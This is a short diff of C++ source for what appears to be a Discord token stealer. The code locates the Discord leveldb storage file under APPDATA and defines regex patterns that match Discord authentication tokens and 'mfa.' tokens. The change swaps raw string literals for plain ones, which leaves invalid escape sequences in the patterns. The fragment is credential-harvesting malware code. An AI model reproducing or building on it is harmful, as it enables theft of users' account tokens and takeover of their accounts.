@@ -15,8 +15,8 @@ using namespace std;
    int errThrower;
    string AppData = getenv("APPDATA");
    string levelDB = AppData + "/Discord/Local Storage/leveldb/000005.ldb";
-   string Regex = R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})";
-   string otherRegex = R"(mfa\.[\w-]{84})";
+   string Regex = "[\w-]{24}\.[\w-]{6}\.[\w-]{27}";
+   string otherRegex = "mfa\.[\w-]{84}";
    string String = "[oken";
    string Content;
 
